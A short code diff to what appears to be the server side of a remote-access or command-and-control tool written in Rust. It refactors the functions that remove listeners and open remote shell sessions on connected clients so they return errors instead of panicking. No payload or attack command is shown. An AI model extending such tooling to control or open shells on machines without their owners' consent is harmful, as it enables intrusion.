@@ -167,14 +167,18 @@ pub fn add_listener(proto : &HeroinnProtocol, port : u16) -> Result<u8>{
     Ok(id)
 }
 
-pub fn remove_listener(id : u8){
+pub fn remove_listener(id : u8) -> Result<()>{
     let mut listener = G_LISTENERS.lock().unwrap();
 
     if listener.contains_key(&id){
         let v = listener.get_mut(&id).unwrap();
         v.close();
         listener.remove(&id);
+    } else {
+        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "listener not found"));
     }
+
+    Ok(())
 }
 
 pub fn all_host() -> Vec<UIHostInfo>{
@@ -208,11 +212,11 @@ pub fn get_hostinfo_by_clientid(clientid: &String) -> Option<UIHostInfo>{
     None
 }
 
-pub fn open_shell(clientid : &String){
+pub fn open_shell(clientid : &String) -> Result<()>{
     
     if let Some(info) = get_hostinfo_by_clientid(clientid){
         let sender = G_SESSION_SENDER.lock().unwrap();
-        let session = ShellServer::new(sender.clone(), clientid , &format!("{}", info.peer_addr)).unwrap();
+        let session = ShellServer::new(sender.clone(), clientid , &format!("{}", info.peer_addr))?;
         drop(sender);
     
         log::info!("create shell session : {}" , session.id());
@@ -221,7 +225,11 @@ pub fn open_shell(clientid : &String){
         
         G_SHELL_SESSION.lock().unwrap().register(session);
     
-        let data = Message::build(HeroinnServerCommandID::Shell.to_u8(), clientid, data).unwrap();
-        send_data_by_clientid(clientid , &data).unwrap();
+        let data = Message::build(HeroinnServerCommandID::Shell.to_u8(), clientid, data)?;
+        send_data_by_clientid(clientid , &data)?;
+    } else {
+        return Err(std::io::Error::new(std::io::ErrorKind::NotFound, "client not found"));
     }
+
+    Ok(())
 }
